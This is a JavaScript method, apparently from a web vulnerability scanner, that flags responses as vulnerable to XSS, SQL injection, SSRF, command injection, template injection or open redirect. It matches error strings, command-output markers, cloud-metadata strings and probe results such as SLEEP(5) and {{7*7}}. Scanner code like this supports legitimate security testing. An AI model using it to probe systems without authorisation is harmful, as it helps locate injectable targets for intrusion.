    // Analyze a response for vulnerability indicators
    _analyzeResponse(response, payload, attackType) {
        if (!response.success) return { vulnerable: false };

        const body = response.body || '';
        const result = { vulnerable: false, evidence: [], confidence: 'LOW', type: attackType };

        switch (attackType) {
            case 'xss':
                // Check if payload is reflected in response
                if (body.includes(payload)) {
                    result.vulnerable = true;
                    result.evidence.push('Payload reflected in response body (unencoded)');
                    result.confidence = 'HIGH';
                }
                // Check for partial reflection
                const stripped = payload.replace(/<\/?[^>]+>/g, '');
                if (stripped && body.includes(stripped) && body.includes('<')) {
                    result.evidence.push('Partial payload reflection detected');
                    if (!result.vulnerable) { result.vulnerable = true; result.confidence = 'MEDIUM'; }
                }
                break;

            case 'sqli':
                // SQL error signatures
                const sqlErrors = [
                    'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
                    'SQLite3::', 'SQLSTATE', 'unclosed quotation mark',
                    'quoted string not properly terminated',
                    'Microsoft SQL', 'ODBC SQL Server', 'pg_query',
                    'warning: mysql', 'valid MySQL result',
                    'You have an error in your SQL syntax',
                    'supplied argument is not a valid MySQL'
                ];
                for (const sig of sqlErrors) {
                    if (body.toLowerCase().includes(sig.toLowerCase())) {
                        result.vulnerable = true;
                        result.evidence.push(`SQL error detected: "${sig}"`);
                        result.confidence = 'HIGH';
                    }
                }
                // Time-based detection
                if (response.elapsed > 4500 && payload.toLowerCase().includes('sleep')) {
                    result.vulnerable = true;
                    result.evidence.push(`Time-based: Response took ${response.elapsed}ms (expected ~5000ms for SLEEP(5))`);
                    result.confidence = 'MEDIUM';
                }
                break;

            case 'ssrf':
                // Check for internal service responses
                if (body.includes('ami-') || body.includes('instance-id') || body.includes('local-ipv4')) {
                    result.vulnerable = true;
                    result.evidence.push('AWS metadata response detected');
                    result.confidence = 'CRITICAL';
                }
                if (body.includes('computeMetadata') || body.includes('service-accounts')) {
                    result.vulnerable = true;
                    result.evidence.push('GCP metadata response detected');
                    result.confidence = 'CRITICAL';
                }
                if (response.status === 200 && response.bodyLength > 0 && payload.includes('127.0.0.1')) {
                    result.vulnerable = true;
                    result.evidence.push('Internal service response received');
                    result.confidence = 'MEDIUM';
                }
                break;

            case 'cmdi':
                // Check for command output
                const cmdSignatures = ['uid=', 'gid=', 'groups=', 'root:', 'www-data', 'bin/bash', 'WINDOWS', 'Directory of'];
                for (const sig of cmdSignatures) {
                    if (body.includes(sig)) {
                        result.vulnerable = true;
                        result.evidence.push(`Command output detected: "${sig}"`);
                        result.confidence = 'CRITICAL';
                    }
                }
                break;

            case 'ssti':
                // Check if template expression was evaluated
                if (payload.includes('7*7') && body.includes('49')) {
                    result.vulnerable = true;
                    result.evidence.push('Template expression {{7*7}} evaluated to 49');
                    result.confidence = 'HIGH';
                }
                if (payload.includes("7*'7'") && body.includes('7777777')) {
                    result.vulnerable = true;
                    result.evidence.push("Jinja2 detected: {{7*'7'}} = 7777777");
                    result.confidence = 'HIGH';
                }
                break;

            case 'redirect':
                // Open redirect detection
                if (response.redirects > 0 && response.headers?.location) {
                    const loc = response.headers.location;
                    if (loc.includes('evil.com') || !loc.startsWith('/')) {
                        result.vulnerable = true;
                        result.evidence.push(`Redirect to external URL: ${loc}`);
                        result.confidence = 'HIGH';
                    }
                }
                break;
        }

        return result;
    }

